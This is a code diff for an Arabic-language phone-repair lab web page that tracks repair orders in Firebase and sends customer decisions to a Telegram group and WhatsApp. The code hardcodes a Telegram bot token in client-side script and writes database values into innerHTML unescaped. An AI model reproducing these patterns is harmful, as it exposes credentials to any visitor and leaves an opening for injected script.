@@ -12,19 +12,13 @@
     <style>
         :root { --main-cyan: #00f2ff; --dark-bg: #0a0b10; --card-bg: #161b22; }
         body { background-color: var(--dark-bg); color: #e6edf3; font-family: 'Cairo', sans-serif; padding-bottom: 50px; }
-
-        /* تنسيق الكروت */
         .mobile-card { background: var(--card-bg); border: 1px solid #30363d; border-radius: 15px; padding: 20px; margin-bottom: 20px; box-shadow: 0 4px 15px rgba(0,0,0,0.3); }
         .id-input-big { background: #000 !important; border: 2px solid var(--main-cyan) !important; color: var(--main-cyan) !important; font-size: 2.2rem; font-weight: bold; text-align: center; border-radius: 12px; margin-bottom: 15px; }
-        
         .btn-action { padding: 12px; border-radius: 12px; font-weight: 700; width: 100%; margin-bottom: 10px; border: none; display: flex; align-items: center; justify-content: center; gap: 10px; transition: 0.3s; }
         .btn-action:active { transform: scale(0.95); }
-
-        /* الأزرار الملونة */
         .btn-approve { background-color: #28a745; color: white; }
         .btn-reject { background-color: #dc3545; color: white; }
         .btn-search { background-color: var(--main-cyan); color: #000; }
-
         .status-dot { height: 10px; width: 10px; border-radius: 50%; display: inline-block; margin-left: 8px; }
         .table-mobile { width: 100%; border-collapse: separate; border-spacing: 0 8px; }
         .table-mobile tr { background: rgba(255,255,255,0.03); }
@@ -107,8 +101,9 @@
     firebase.initializeApp(firebaseConfig);
     const db = firebase.database();
 
+    // إعدادات البوت والمجموعة
     const botToken = "8405532039:AAECWN7krzYjq_i18_Q1AGS4xHarPx832ck";
-    const myChatId = "8459612624";
+    const myChatId = "-5054048198"; // تم تحديثه لرقم مجموعتك ✅
     let activeId = "";
 
     function toggleAdmin() {
@@ -130,7 +125,7 @@
                 if(d.decision) {
                     document.getElementById('approvalSection').style.display = 'none';
                     document.getElementById('successMsg').style.display = 'block';
-                    document.getElementById('successMsg').innerHTML = `<i class="fas fa-info-circle"></i> تم تسجيل ردك بـ: <br> ${d.decision}`;
+                    document.getElementById('successMsg').innerHTML = `<i class="fas fa-check-circle"></i> تم تسجيل ردك بـ: <br> ${d.decision}`;
                 } else {
                     document.getElementById('approvalSection').style.display = 'block';
                     document.getElementById('successMsg').style.display = 'none';
@@ -141,11 +136,14 @@
 
     async function setDecision(val) {
         if(!activeId) return;
+        if(!confirm(`هل أنت متأكد من قرار: ${val}؟`)) return;
+
         const s = await db.ref('orders/' + activeId).get();
         const data = s.val();
         await db.ref('orders/' + activeId).update({ decision: val });
         
-        const msg = `🔔 رد جديد من زبون:\n📱 الجهاز: ${data.model}\n🔢 الرقم: ${activeId}\n📢 القرار: ${val}`;
+        // إرسال الإشعار للمجموعة
+        const msg = `🔔 تحديث جديد من المختبر:\n\n📱 الجهاز: ${data.model}\n🔢 الرقم: ${activeId}\n📢 قرار الزبون: ${val}`;
         fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${myChatId}&text=${encodeURIComponent(msg)}`);
     }
 
@@ -202,7 +200,7 @@
     function deleteForever(id) { if(confirm("حذف نهائي؟")) db.ref('archive/' + id).remove(); }
 
     function sendWA(phone, model, id) {
-        const msg = `مرحباً بك من  حذيفة الذيب 🛠%0A%0Aجهازك (${model}) برقم (${id}) أصبح: *جاهز للاستلام ✅*`;
+        const msg = `مرحباً بك من مختبر حذيفة الذيب 🛠%0A%0Aجهازك (${model}) برقم (${id}) أصبح: *جاهز للاستلام ✅*`;
         window.open(`https://wa.me/${phone}?text=${msg}`, '_blank');
     }
 
@@ -213,9 +211,11 @@
         const pr = document.getElementById('newProblem').value;
         if(id && mo && ph && pr) {
             await db.ref('orders/' + id).set({ id, model: mo, phone: ph, problem: pr, decision: "" });
-            alert("تمت الإضافة بنجاح");
+            alert("تمت إضافة الجهاز للنظام بنجاح");
             document.getElementById('newId').value = "";
             document.getElementById('newModel').value = "";
+            document.getElementById('newPhone').value = "";
+            document.getElementById('newProblem').value = "";
         } else { alert("يرجى ملء جميع الحقول"); }
     }
 </script>
